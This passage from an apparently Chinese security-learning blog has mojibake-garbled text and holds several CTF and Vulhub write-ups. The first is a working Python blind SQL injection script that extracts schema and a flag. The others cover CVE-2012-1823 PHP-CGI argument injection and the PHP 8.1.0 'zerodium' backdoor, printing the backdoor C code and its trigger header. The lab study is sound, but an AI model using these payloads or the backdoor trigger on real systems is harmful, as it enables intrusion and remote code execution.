class="number">127</span></span><br><span class="line">        mid = (left + right) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            payload = <span class="string">&#x27;if((asCii(suBstr(database(),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)--+&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            str3 = url + payload</span><br><span class="line">            <span class="comment"># print(str3)</span></span><br><span class="line">            res = requests.get(url=str3)</span><br><span class="line">            <span class="keyword">if</span> check(res):</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        databasename += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(databasename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checktable</span>():</span><br><span class="line">    tablename = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">            payload = <span class="string">&#x27;if((asCii(Substr((selEct groUp_Concat(tabLe_nAme) frOm infOrMation_schEma.taBles whEre tabLe_Schema = database()),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)--+&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            str4 = url + payload</span><br><span class="line">            <span class="comment"># print(str4)</span></span><br><span class="line">            res = requests.get(url=str4)</span><br><span class="line">            <span class="keyword">if</span> check(res):</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        tablename += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(tablename)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkcolumn</span>():</span><br><span class="line">    columnname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">80</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">            payload = <span class="string">&#x27;if((asCii(Substr((selEct groUp_Concat(column_nAme) frOm infOrMation_schEma.columns whEre tabLe_name = \&#x27;here_is_flag\&#x27;),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)--+&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            str5 = url + payload</span><br><span class="line">            <span class="comment"># print(str5)</span></span><br><span class="line">            res = requests.get(url=str5)</span><br><span class="line">            <span class="keyword">if</span> check(res):</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        columnname += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(columnname)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">checkflag</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">80</span>):</span><br><span class="line">        left = <span class="number">32</span></span><br><span class="line">        right = <span class="number">127</span></span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(left&lt;right):</span><br><span class="line">            payload = <span class="string">&#x27;if((asCii(Substr((selEct flag from here_is_flag),&#123;&#125;,1)))&gt;&#123;&#125;,1,0)--+&#x27;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">            str6 = url + payload</span><br><span class="line">            <span class="comment"># print(str6)</span></span><br><span class="line">            res = requests.get(url=str6)</span><br><span class="line">            <span class="keyword">if</span> check(res):</span><br><span class="line">                left = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># checklength()</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># checkdataname()</span></span><br><span class="line"><span class="comment"># ctf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># checktable()</span></span><br><span class="line"><span class="comment"># grades,here_is_flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># checkcolumn()</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># checkflag()</span></span><br><span class="line"><span class="comment"># flag&#123;845ef206-8555-440b-a654-6cfa251cf139&#125;</span></span><br></pre></td></tr></table></figure>



</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey">Â </i><a class="article-more button is-small link-muted index-categories" href="/categories/buu%E5%B9%B3%E5%8F%B0/">buuå¹³å°</a></div>Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-03-19Â Â <a class="commentCountImg" href="/2024/03/19/vulhub/CVE-2012-1823/#comment-container"><span class="display-none-class">c824095b631cf6a662c30f780672e4e6</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="c824095b631cf6a662c30f780672e4e6">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>9 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>1.3Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/03/19/vulhub/CVE-2012-1823/">CVE-2012-1823å¤ç°</a></h1><div class="content"><h1 id="CVE-2012-1823"><a href="#CVE-2012-1823" class="headerlink" title="CVE-2012-1823"></a>CVE-2012-1823</h1><p>ç®€å•å¤ç°</p>
<img src="/2024/03/19/vulhub/CVE-2012-1823/image-20240319184647559.png" class="" title="image-20240319184647559">

<p>æ ¹æ®æç¤ºï¼Œå¯ä»¥è¿›å…¥index.phpçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯</p>
<p>å¹¶æ²¡æœ‰å­˜åœ¨ä»€ä¹ˆä¿¡æ¯ï¼Œæ ¹æ®æç¤ºï¼Œå½“è¾“å…¥<code>/index.php?-s</code>æ—¶ä¼šæš´éœ²åç«¯æºç </p>
<img src="/2024/03/19/vulhub/CVE-2012-1823/image-20240319185125049.png" class="" title="image-20240319185125049">

<p>æ¼æ´å…¨è²Œå¤§æ¦‚å°±è¿™æ ·</p>
<h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>å…ˆå¼•å…¥ä¸€ä¸ªæ¦‚å¿µå’Œå®ƒå¼•ç”³çš„åˆ†æ”¯</p>
<h3 id="ä»€ä¹ˆæ˜¯CGI-confused"><a href="#ä»€ä¹ˆæ˜¯CGI-confused" class="headerlink" title="ä»€ä¹ˆæ˜¯CGI(:confused:)"></a>ä»€ä¹ˆæ˜¯CGI(:confused:)</h3><p>Common Gateway Interfaceï¼Œå³é€šç”¨ç½‘å…³æ¥å£ï¼Œå®ƒæ˜¯ä¸€ä¸ªWebæœåŠ¡å™¨ä¸»æœºæä¾›ä¿¡æ¯æœåŠ¡çš„æ ‡å‡†æ¥å£ï¼ŒWebæœåŠ¡å™¨é€šè¿‡è¿™ä¸ªæ¥å£æ¥è·å–å®¢æˆ·ç«¯æäº¤çš„ä¿¡æ¯ï¼Œç„¶åè½¬äº¤ç»™æœåŠ¡ç«¯çš„CGIç¨‹åºå¤„ç†ï¼Œæœ€åå†è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p>
<h3 id="PHP-CGI"><a href="#PHP-CGI" class="headerlink" title="PHP-CGI"></a>PHP-CGI</h3><p>å®ƒæ˜¯ä¸€ä¸ªç”¨äºå¤„ç†PHPè„šæœ¬çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¯¥æ–‡ä»¶ä½¿ç”¨CGIæ¥ä¸WEBæœåŠ¡å™¨é€šä¿¡ï¼Œåœ¨æ¥æ”¶HTTPè¯·æ±‚çš„åŒæ—¶å¤„ç†PHPè„šæœ¬ï¼Œç„¶åå†å°†ç»“æœè¿”å›ç»™WEBæœåŠ¡å™¨</p>
<h3 id="SAPIæ˜¯ä»€ä¹ˆ"><a href="#SAPIæ˜¯ä»€ä¹ˆ" class="headerlink" title="SAPIæ˜¯ä»€ä¹ˆ"></a>SAPIæ˜¯ä»€ä¹ˆ</h3><p>Server Application Programming Interfaceï¼ŒæœåŠ¡å™¨åº”ç”¨ç¼–ç¨‹æ¥å£ï¼Œå®é™…ä¸Šå®ƒå®šä¹‰äº†ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ï¼Œæä¾›äº†å¤–éƒ¨åº”ç”¨ä¸PHPé€šä¿¡äº¤äº’çš„ç®¡é“ï¼ŒApacheçš„mod_phpå’Œå¸¸è§çš„fpmï¼ˆç”¨äºç®¡ç†FastCGIåç«¯çš„è¿›ç¨‹ï¼‰éƒ½æ˜¯SAPIï¼Œè¿™é‡Œæˆ‘ä»¬è¦è¯´çš„php-cgiä¹Ÿæ˜¯ä¸€ç§SAPI</p>
<h3 id="è¿›å…¥æ­£é¢˜"><a href="#è¿›å…¥æ­£é¢˜" class="headerlink" title="è¿›å…¥æ­£é¢˜"></a>è¿›å…¥æ­£é¢˜</h3><h4 id="ç›´æ¥æˆå› "><a href="#ç›´æ¥æˆå› " class="headerlink" title="ç›´æ¥æˆå› "></a>ç›´æ¥æˆå› </h4><p>ç”¨æˆ·è¯·æ±‚çš„querystringè¢«ä½œä¸ºäº†php-cgiçš„å‚æ•°ï¼Œå¹¶å¯¼è‡´äº†ä¸€äº›ç»“æœ</p>
<p>:::info</p>
<p>querystringï¼Œå³æŸ¥è¯¢å­—ç¬¦ä¸²ï¼Œå®ƒæ˜¯urlçš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºä¼ é€’å…¶ä»–å‚æ•°å’Œæ•°æ®ï¼Œ<code>www.example.com/?key=value</code>ä¸­ï¼Œquerystringä¸º<code>?</code>åé¢çš„ä¸€éƒ¨åˆ†</p>
<p>:::</p>
<h4 id="æ·±ç©¶ä¸€ä¸‹"><a href="#æ·±ç©¶ä¸€ä¸‹" class="headerlink" title="æ·±ç©¶ä¸€ä¸‹"></a>æ·±ç©¶ä¸€ä¸‹</h4><p>çœ‹äº†çœ‹å…¶ä»–å¤§ä½¬çš„æ–‡ç« ï¼Œå‘ç°CGIæœ‰å¦‚ä¸‹å‚æ•°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">SERVER_SOFTWAREï¼šè¿è¡ŒæœåŠ¡å™¨çš„åç§°å’Œç‰ˆæœ¬ã€‚</span><br><span class="line">SERVER_NAMEï¼šæœåŠ¡å™¨çš„ä¸»æœºåã€åŸŸåæˆ–IPåœ°å€ã€‚</span><br><span class="line">GATEWAY_INTERFACEï¼šCGIè§„èŒƒçš„ç‰ˆæœ¬ã€‚</span><br><span class="line">SERVER_PROTOCOLï¼šè¯·æ±‚ä½¿ç”¨çš„åè®®åç§°å’Œç‰ˆæœ¬ï¼Œä¾‹å¦‚HTTP/1.1ã€‚</span><br><span class="line">SERVER_PORTï¼šæœåŠ¡å™¨æ¥æ”¶è¯·æ±‚çš„ç«¯å£å·ã€‚</span><br><span class="line">REQUEST_METHODï¼šè¯·æ±‚ä½¿ç”¨çš„æ–¹æ³•ï¼Œä¾‹å¦‚GETã€POSTã€‚</span><br><span class="line">PATH_INFOï¼šè„šæœ¬åçš„é¢å¤–è·¯å¾„ä¿¡æ¯ï¼Œç”¨äºä¼ é€’ç»™è„šæœ¬ã€‚</span><br><span class="line">PATH_TRANSLATEDï¼šæ ¹æ®PATH_INFOè½¬æ¢åçš„å®é™…è·¯å¾„ã€‚</span><br><span class="line">SCRIPT_NAMEï¼šè„šæœ¬çš„è™šæ‹Ÿè·¯å¾„ã€‚</span><br><span class="line">QUERY_STRINGï¼šURLä¸­é—®å·ï¼ˆ?ï¼‰åé¢çš„æŸ¥è¯¢å­—ç¬¦ä¸²ã€‚</span><br><span class="line">REMOTE_HOSTï¼šå‘å‡ºè¯·æ±‚çš„å®¢æˆ·ç«¯ä¸»æœºåã€‚</span><br><span class="line">REMOTE_ADDRï¼šå‘å‡ºè¯·æ±‚çš„å®¢æˆ·ç«¯IPåœ°å€ã€‚</span><br><span class="line">REMOTE_USERï¼šæœåŠ¡å™¨è¿›è¡Œè®¤è¯åï¼Œè®¤å®šçš„ç”¨æˆ·åç§°ã€‚</span><br><span class="line">REMOTE_IDENTï¼šç”¨æˆ·çš„HTTPèº«ä»½ä¿¡æ¯ï¼Œå¦‚æœHTTPæœåŠ¡å™¨æ”¯æŒRFC 1413ã€‚</span><br><span class="line">CONTENT_TYPEï¼šå¯¹äºPOSTè¯·æ±‚ï¼Œæ•°æ®çš„å†…å®¹ç±»å‹ã€‚</span><br><span class="line">CONTENT_LENGTHï¼šå¯¹äºPOSTè¯·æ±‚ï¼Œæ•°æ®çš„é•¿åº¦ã€‚</span><br><span class="line">HTTP_ACCEPTï¼šå®¢æˆ·ç«¯æ¥å—çš„MIMEç±»å‹ã€‚</span><br><span class="line">HTTP_USER_AGENTï¼šå‘å‡ºè¯·æ±‚çš„å®¢æˆ·ç«¯æµè§ˆå™¨çš„æ ‡è¯†å­—ç¬¦ä¸²ã€‚</span><br><span class="line">HTTP_COOKIEï¼šå®¢æˆ·ç«¯å‘é€çš„Cookieã€‚</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®RFC3875å¯¹Command Lineçš„æè¿°ï¼š</p>
<p><code>Some systems support a method for supplying an array of strings to the CGI script.This is only used in the case of an &#39;indexed&#39; HTTP query, which is identified by a &#39;GET&#39; or &#39;HEAD&#39; request with a URI query string that does not contain any unencoded &quot;=&quot; characters. For such a request, the server SHOULD treat the query-string as a search-string and parse it into words, using the rules</code></p>
<p>å¤§è‡´æ„æ€æ˜¯querystringä¸­å¦‚æœä¸åŒ…å«æœªç¼–ç çš„<code>=</code>ã€‚å°±ä¼šæŠŠquerystringä½œä¸ºcgiçš„å‚æ•°ä¼ å…¥</p>
<h2 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h2><p>CGIæ¨¡å¼ä¸‹æœ‰å‡ ä¸ªå‚æ•°å¯ä»¥ç”¨ï¼š</p>
<ul>
<li><code>-c</code> æŒ‡å®šphp.iniæ–‡ä»¶çš„ä½ç½®</li>
<li><code>-n</code> ä¸è¦åŠ è½½php.iniæ–‡ä»¶</li>
<li><code>-d</code> æŒ‡å®šé…ç½®é¡¹</li>
<li><code>-b</code> å¯åŠ¨fastcgiè¿›ç¨‹</li>
<li><code>-s</code> æ˜¾ç¤ºæ–‡ä»¶æºç </li>
<li><code>-T</code> æ‰§è¡ŒæŒ‡å®šæ¬¡è¯¥æ–‡ä»¶</li>
<li><code>-h</code>å’Œ<code>-?</code> æ˜¾ç¤ºå¸®åŠ©</li>
</ul>
<p>ç”±äºæˆ‘ä»¬æ˜¯åœ¨CGIæ¨¡å¼ä¸‹å¤ç°çš„ï¼Œå› æ­¤å¯ä»¥ç›´æ¥ä¼ é€’å‚æ•°ï¼Œæ•ˆæœå·²ç»åœ¨å‰é¢å±•ç¤ºè¿‡äº†</p>
<p>è¿˜æœ‰ä¸€ç§ç”¨æ³•å°±æ˜¯é€šè¿‡<code>-d</code>æ¥å®ç°getshellï¼Œä¾‹å¦‚æŠŠæ–‡ä»¶åŒ…å«åŠŸèƒ½æ‰“å¼€ï¼Œç”¨æ–‡ä»¶åŒ…å«æ¼æ´</p>
<img src="/2024/03/19/vulhub/CVE-2012-1823/image-20240320143141872.png" class="" title="image-20240320143141872">

<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>å®é™…ä¸Šè¿˜æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œæ”»ç ´å‘½ä»¤è¿™ä¸€å…³ä¹‹åç”¨ä»€ä¹ˆå•¥æ–¹æ³•éƒ½è¡Œ:laughing:</p>
<h2 id="å…¶ä»–å¯ä»¥äº†è§£çš„"><a href="#å…¶ä»–å¯ä»¥äº†è§£çš„" class="headerlink" title="å…¶ä»–å¯ä»¥äº†è§£çš„"></a>å…¶ä»–å¯ä»¥äº†è§£çš„</h2><h3 id="CGIçš„å·¥ä½œåŸç†"><a href="#CGIçš„å·¥ä½œåŸç†" class="headerlink" title="CGIçš„å·¥ä½œåŸç†"></a>CGIçš„å·¥ä½œåŸç†</h3><img src="/2024/03/19/vulhub/CVE-2012-1823/image-20240320122116024.png" class="" title="image-20240320122116024">

<ol>
<li>æ ¹æ®netå‘é€è¯·æ±‚ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ¥æ”¶è¯·æ±‚ï¼›</li>
<li>æœåŠ¡å™¨å°†è¯·æ±‚å‘é€ç»™CGIç¨‹åºå¤„ç†ï¼›</li>
<li>CGIç¨‹åºå°†å¤„ç†å¥½çš„ç»“æœå‘é€ç»™æœåŠ¡å™¨ï¼›</li>
<li>æœåŠ¡å™¨æ¥æ”¶ç»“æœåå°†å…¶å‘é€ç»™ç”¨æˆ·ã€‚</li>
</ol>
<h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>å®ƒæ˜¯åœ¨åŸæœ‰çš„CGIä¸Šä¼˜åŒ–å‡ºæ¥çš„äº§ç‰©ã€‚ç”±äºè¿›ç¨‹çš„åˆ›å»ºå’Œè°ƒåº¦éƒ½éœ€è¦ä¸€å®šçš„æ¶ˆè€—ï¼Œè¿›ç¨‹æ•°é‡æœ‰é™ï¼Œå› æ­¤åŸºäºCGIæ¨¡å¼è¿è¡Œçš„ç½‘ç«™ä¸€èˆ¬ä¸èƒ½æ¥æ”¶å¤§é‡è¯·æ±‚ï¼Œå¦åˆ™æ¯ä¸ªè¿›ç¨‹åˆ›é€ å‡ºæ¥çš„å­è¿›ç¨‹å¯èƒ½ä¼šå¯¼è‡´æœåŠ¡å™¨è¢«æŒ¤çˆ†æˆ–è€…ç˜«ç—ªã€‚FastCGIç›¸è¾ƒäºåŸæ¥çš„CGIï¼Œå®ƒæ›´åƒæ˜¯ä¸€ç§å¸¸é©»å‹ç¨‹åºï¼Œå‡å°‘äº†åœ¨è¿›ç¨‹åˆ›å»ºå’Œé”€æ¯æ–¹é¢çš„æ¶ˆè€—ï¼Œæé«˜äº†å¤„ç†Webè¯·æ±‚çš„æ•ˆç‡ã€‚</p>
<p>è¿™ä¸ªæ¼æ´åªå‡ºç°åœ¨CGIè¿è¡Œæ¨¡å¼ä¸­ï¼ˆå¦‚æœæˆ‘æ²¡è®°é”™çš„è¯:confounded:ï¼‰</p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey">Â </i><a class="article-more button is-small link-muted index-categories" href="/categories/Vulhub/">Vulhub</a></div>Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-03-19Â Â <a class="commentCountImg" href="/2024/03/19/vulhub/81backdoor/#comment-container"><span class="display-none-class">74a8dd76d6223ddb5d56e62e7e9b3b07</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="74a8dd76d6223ddb5d56e62e7e9b3b07">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>4 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.6Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/03/19/vulhub/81backdoor/">81backdoor</a></h1><div class="content"><h1 id="8-1-0-phpåé—¨"><a href="#8-1-0-phpåé—¨" class="headerlink" title="8.1.0 phpåé—¨"></a>8.1.0 phpåé—¨</h1><h2 id="ä¸€ä¸ªç®€å•çš„å¤ç°"><a href="#ä¸€ä¸ªç®€å•çš„å¤ç°" class="headerlink" title="ä¸€ä¸ªç®€å•çš„å¤ç°"></a>ä¸€ä¸ªç®€å•çš„å¤ç°</h2><p>åˆ©ç”¨dockeræ­å»ºèµ·æ¥ååªæœ‰ä¸€å¥è¯</p>
<img src="/2024/03/19/vulhub/81backdoor/image-20240319134841231.png" class="" title="image-20240319134841231">

<p>æŠ“ä¸ªåŒ…çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿</p>
<img src="/2024/03/19/vulhub/81backdoor/image-20240319135202904.png" class="" title="image-20240319135202904">

<p>ä¸¢åˆ°repeateråå‘åŒ…ä¹Ÿæ²¡çœ‹åˆ°æœ‰ä»€ä¹ˆ</p>
<p>æ ¹æ®æç¤ºï¼Œå¯ä»¥åœ¨è¯·æ±‚å¤´éƒ¨åŠ <code>User-Agentt: zerodiumvar_dump(2*3);</code></p>
<img src="/2024/03/19/vulhub/81backdoor/image-20240319135830712.png" class="" title="image-20240319135830712">

<p>å¯ä»¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œ</p>
<img src="/2024/03/19/vulhub/81backdoor/image-20240319140149516.png" class="" title="image-20240319140149516">

<h2 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>2021å¹´PHP Gitä»“åº“é­åˆ°å…¥ä¾µï¼Œæ”»å‡»è€…åœ¨PHPæºç ä¸­æ¤å…¥äº†æ¶æ„ä»£ç ï¼Œè¿™ç§æ¶æ„ä»£ç æ˜¯è¢«æ”»å‡»è€…ä¼ªè£…æˆå¼€å‘è€…æˆ–ç»´æŠ¤è€…çš„èº«ä»½æ¥è¿›è¡Œæäº¤ï¼Œå®é™…æ•ˆæœæ˜¯æ¤å…¥äº†ä¸€ä¸ªè¿œç¨‹RCEåé—¨ã€‚å®ƒä¼šé€šè¿‡æ£€æŸ¥HTTPå¤´ä¸­çš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæ˜¯ä»¥zerodiumå¼€å¤´ï¼Œåˆ™ä¼šè§¦å‘åé—¨ï¼Œæ‰§è¡Œphpä»£ç </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	zval zoh;</span><br><span class="line">	php_output_handler *h;</span><br><span class="line">	zval *enc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL(<span class="string">&quot;_SERVER&quot;</span>))) &amp;&amp; (enc = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), <span class="string">&quot;HTTP_USER_AGENTT&quot;</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;HTTP_USER_AGENTT&quot;</span>) - <span class="number">1</span>))) &#123;</span><br><span class="line">		convert_to_string(enc);</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">strstr</span>(Z_STRVAL_P(enc), <span class="string">&quot;zerodium&quot;</span>)) &#123;</span><br><span class="line">			zend_try &#123;</span><br><span class="line">				zend_eval_string(Z_STRVAL_P(enc)+<span class="number">8</span>, <span class="literal">NULL</span>, <span class="string">&quot;REMOVETHIS: sold to zerodium, mid 2017&quot;</span>);</span><br><span class="line">			&#125; zend_end_try();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ”»å‡»è€…ç”¨äº†ä¸€ä¸ªè®©äººæ··æ·†çš„<code>HTTP_USER_AGENTT</code>å¤´ï¼Œ<code>zend_try</code>å’Œ<code>zend_end_try</code>ç”¨äºå¼‚å¸¸å¤„ç†ï¼Œå³ä½¿æ‰§è¡Œçš„ä»£ç æœ‰é—®é¢˜ä¹Ÿä¸ä¼šé€ æˆphpçš„å´©æºƒ</p>
<p>åœ¨<code>strstr(Z_STRVAL_P(enc), &quot;zerodium&quot;)</code>ä¸­ï¼Œ<code>strstr()</code>å‡½æ•°ç”¨äºæŸ¥æ‰¾ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ˜¯å¦æœ‰åŒ…å«ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ï¼Œå°±è¿”å›åè€…åœ¨å‰è€…ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®çš„æŒ‡é’ˆï¼Œæ²¡æœ‰å°±è¿”å›<code>NULL</code>ï¼›</p>
<p><code>Z_STRVAL_P(enc)</code>äº†è§£ä¸€ä¸‹å°±è¡Œï¼Œå®ƒæ˜¯PHPæ‰©å±•å¼€å‘ä¸­çš„ä¸€ä¸ªå®ï¼Œç”¨äºä»zvalç»“æ„ä½“å˜é‡ä¸­æå–å­—ç¬¦ä¸²</p>
<p>:::info</p>
<p>zvalç»“æ„ä½“æ„æˆæ¯”è¾ƒå¤æ‚ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥<a target="_blank" rel="noopener" href="https://learnku.com/docs/php-internals/php7/zvals_basic_structure/6851">ç‚¹å‡»è¿™é‡Œ</a></p>
<p>:::</p>
<p><code>zend_eval_string()</code>ç›¸å½“äº<code>eval()</code>ï¼Œç¬¬äºŒä¸ªå˜é‡ç”¨äºæ¥å—æ‰§è¡Œç»“æœï¼ŒNULLåˆ™è¡¨ç¤ºä¸å…³å¿ƒæ‰§è¡Œç»“æœ</p>
<p>[:heavy_check_mark:getä¸€ç‚¹]{.label .success}çœ‹ä¼¼ä»£ç é•¿ï¼Œå®é™…ä¸Šä»”ç»†åˆ†æä¹‹åä¹Ÿå°±é‚£æ ·ï¼Œå‡½æ•°æ‰§è¡Œä»€ä¹ˆåŠŸèƒ½ä¸€èˆ¬å°±ä¼šä»¥ä»€ä¹ˆåŠŸèƒ½çš„å•è¯å‘½åï¼Œè¿˜ç®—å¥½ç†è§£çš„</p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey">Â </i><a class="article-more button is-small link-muted index-categories" href="/categories/Vulhub/">Vulhub</a></div>Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-03-18Â Â <a class="commentCountImg" href="/2024/03/18/competition/202403/DUTCTF2024/#comment-container"><span class="display-none-class">381b6e6ae07bcd2482855419bac0a401</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="381b6e6ae07bcd2482855419bac0a401">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>20 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>3.0Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/03/18/competition/202403/DUTCTF2024/">DUTCTF2024å¤ç°</a></h1><div class="content"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="æ•°æ®åº“åˆå­¦è€…-disappointed"><a href="#æ•°æ®åº“åˆå­¦è€…-disappointed" class="headerlink" title="æ•°æ®åº“åˆå­¦è€… :disappointed:"></a>æ•°æ®åº“åˆå­¦è€… :disappointed:</h2><p>æˆ‘çŸ¥é“è¿™æ˜¯sqlæ³¨å…¥ï¼Œä½†å”¯ç‹¬å°±æ²¡æœ‰å¾€æŠ¥é”™æ³¨å…¥è€ƒè™‘ï¼Œä¸€ç›´ç»™æˆ‘è¯­æ³•æŠ¥é”™æˆ‘è¿˜ä»¥ä¸ºæ˜¯å“ªå†™çš„ä¸å¯¹â€¦â€¦:sob::sob::sob:</p>
<p>:::info</p>
<p>æŠ¥é”™æ³¨å…¥å¸¸ç”¨çš„å‡½æ•°updatexmlçš„ç®€å•äº†è§£</p>
<p>updatexml(xml_doument,XPath_string,new_value) </p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯xmlæ–‡ä»¶çš„å†…å®¹ï¼Œæ ¼å¼ä¸€èˆ¬ä¸ºstring</p>
